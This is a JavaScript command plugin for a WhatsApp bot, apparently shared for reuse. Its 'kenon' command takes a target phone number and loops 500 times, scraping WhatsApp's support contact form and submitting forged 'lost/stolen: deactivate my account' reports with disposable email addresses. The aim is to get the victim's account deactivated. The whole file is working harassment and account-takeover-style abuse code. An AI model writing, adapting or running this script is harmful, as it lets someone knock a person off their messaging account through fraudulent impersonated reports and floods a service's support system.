/*
wa.me/6282285357346
github: https://github.com/sadxzyq
Instagram: https://instagram.com/tulisan.ku.id
ini wm gw cok jan di hapus
*/

import axios from "axios"
import cheerio from "cheerio"
import PhoneNumber from "awesome-phonenumber"


let handler = async (m, { conn, text, args, command, usedPrefix}) => {
if (!args[0]) return m.reply(`Penggunaan ${usedPrefix+command} nomor\nContoh ${usedPrefix+command} 6282285357346`)
let nom = `+` + text.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await conn.onWhatsApp(nom)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)

for (let x = 0; x < 500; x++) {
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await fetchJson("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=500")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", nom)
form.append("email", email[0])
form.append("email_confirm", email[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta");
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
}
}
handler.command = ['kenon']
handler.limit = true
handler.register = true

export default handler